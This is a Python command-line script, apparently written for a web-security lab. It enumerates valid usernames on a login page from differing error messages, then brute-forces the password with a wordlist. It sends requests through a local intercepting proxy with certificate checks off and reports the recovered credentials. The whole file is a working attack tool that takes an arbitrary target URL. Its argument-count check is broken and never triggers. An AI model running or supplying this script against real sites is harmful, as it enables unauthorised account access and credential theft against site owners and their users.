import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def username_enumeration(url, session, username_wordlist="/home/kali/usernames.txt",
                         password_wordlist="/home/kali/passwords.txt"):
    print("[*] Enumerating a valid username")
    login_url = url + "/login"
    valid_username = ""
    valid_password = ""
    username_found = False
    password_found = False
    for username in open(username_wordlist):
        login_data = {"username": username.strip(), "password": "test"}
        response = session.post(url=login_url, data=login_data, verify=False, proxies=proxies)

        print(f"[*] Checking username '{username.strip()}' ....")
        if not "Invalid username" in response.text:
            valid_username = username
            print("[*] A valid username was found")
            print("[*] The valid username is " + username.strip())
            username_found = True
            break

    if not username_found:
        print("[*] No valid username was found within the given wordlist")
        sys.exit(-1)

    if username_found:
        print("[*] Now checking for a valid password ....")

        for password in open(password_wordlist):
            print(f"[*] Checking password '{password.strip()}' ....")
            login_data = {"username": valid_username.strip(), "password": password.strip()}
            response = session.post(url=login_url, data=login_data, verify=False, proxies=proxies)
            if not "Incorrect password" in response.text:
                valid_passowrd = password
                print("[*] A valid password was found")
                print(f"[*] The valid credintials are '{valid_username.strip()}:{password.strip()}'")
                print("[*] Exploit was successful :)")
                password_found = True
                break
        if not password_found:
            print("[*] No valid password was found within the given wordlist ")
            sys.exit(-1)


def main():
    if len(sys.argv) < 2 and len(sys.argv) > 4:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url> <username_wordlist> <password wordlist>")
        print(f"[*] Example {sys.argv[0]} https://example.com usernames.txt passwords.txt")
        sys.exit(-1)
    else:
        session = requests.Session()
        if len(sys.argv) == 2:
            username_enumeration(sys.argv[1], session)
        else:
            username_enumeration(sys.argv[1], session, sys.argv[2], sys.argv[3])


if __name__ == "__main__":
    main()


